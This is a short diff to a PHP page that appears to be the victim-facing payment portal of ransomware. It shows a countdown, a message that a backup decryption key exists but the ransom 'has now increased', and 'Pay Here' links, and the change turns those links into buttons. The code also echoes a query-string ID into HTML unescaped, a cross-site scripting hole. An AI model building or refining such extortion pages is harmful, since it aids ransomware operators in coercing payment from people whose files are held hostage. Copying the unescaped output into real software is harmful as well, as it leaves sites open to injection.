@@ -37,13 +37,13 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
                   echo "<br /><br /><br />";
                   echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
                   echo "</font>";
-                  echo "<a href='/payment.php?unique_id=$uniqueID'>Pay here</a><br /><br />";
+                  echo "<a href=\"/payment.php?unique_id=$uniqueID\"><input type=\"submit\" value=\"Pay Here\"></a>";
                   echo "</center>";
                }
             } else {
                echo "<center><font color='red'>";
                echo "<h1>Time Remaining for $uniqueID: " . $row['time_left'] . "</h1><br /><br />";
-               echo "<a href='/payment.php?unique_id=$uniqueID'>Pay here</a><br /><br />";
+               echo "<a href=\"/payment.php?unique_id=$uniqueID\"><input type=\"submit\" value=\"Pay Here\"></a>";
                echo "</font></center>";
             }
       }
